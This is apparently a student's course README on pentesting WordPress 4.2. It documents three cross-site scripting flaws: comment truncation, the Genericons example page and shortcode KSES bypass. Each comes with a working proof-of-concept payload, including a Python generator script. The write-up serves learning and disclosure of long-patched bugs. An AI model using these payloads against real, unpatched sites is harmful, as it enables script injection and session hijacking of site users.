# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Unauthenticated Stored Cross-Site Scripting
  - [ ] Summary: 
    - A comment longer than the SQL "text" field that stores it can lead to truncation and malformed HTML, opening up opportunities for XSS.
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
    - Create an "<a>" tag longer than 64k, which upon truncation renders as malformed HTML. Browsers try to fix this which leads to interpretation of the onmouseover exploit.
    - Sample exploit generator:
    ```python
    out = "<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  "
    for x in range(64*1024):
      out += "A"
    out += "</a>"
    print out
    ```
  - [ ] Affected source code:
    - None, this is an SQL field size limitation that causes this exploit to work due to truncation
  - [ ] Reference:
    - https://wpvulndb.com/vulnerabilities/7945
    - http://klikki.fi/adv/wordpress2.html

2. Unauthenticated Genericons Cross-Site Scripting
  - [ ] Summary: 
    - A leftover example file in one of the default wordpress includes (Genericons) is vulnerable to XSS.
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.2
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
    - Create a malicious link using the "filter" feature of the genericons example page with XSS embedded in it.
    - Example: 
    ```
    http://wpsite/wp-content/themes/twentyfifteen/genericons/example.html#1<img/ src=1 onerror= alert(1)>
    ```
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2/src/wp-content/themes/twentyfifteen/genericons/example.html)
    - Removed in WP 4.2.2
  - [ ] Reference:
    - https://wpvulndb.com/vulnerabilities/7979

3. Authenticated Shortcode Tags Cross-Site Scripting
  - [ ] Summary: 
    - Shortcode tags can be mixed with HTML to lead to malformed HTML, bypassing KSES validation and opening up XSS. This can be combined with other vulnerabilities discovered by the same person to allow a read-only "Subscriber" user to escalate privilege and create persistent XSS.
    - Vulnerability types: XSS
    - Tested in version: 4.2
    - Fixed in version: 4.2.5
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
    - Get funky with quotes and put HTML inside of shortcodes
    - Example:
    ```
    [caption width='1' caption='<a href="' ">]</a><a href="onClick='alert(1)'">
    ```
  - [ ] Affected source code:
    - [Link 1](https://github.com/WordPress/WordPress/commit/f72b21af23da6b6d54208e5c1d65ececdaa109c8)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
1. (Optional) Vulnerability Name or ID
  - [ ] Summary: 
    - Vulnerability types:
    - Tested in version:
    - Fixed in version: 
  - [ ] GIF Walkthrough: 
  - [ ] Steps to recreate: 
  - [ ] Affected source code:
    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php) 

## Assets

List any additional assets, such as scripts or files

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

Describe any challenges encountered while doing the work

## License

    Copyright [yyyy] [name of copyright owner]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
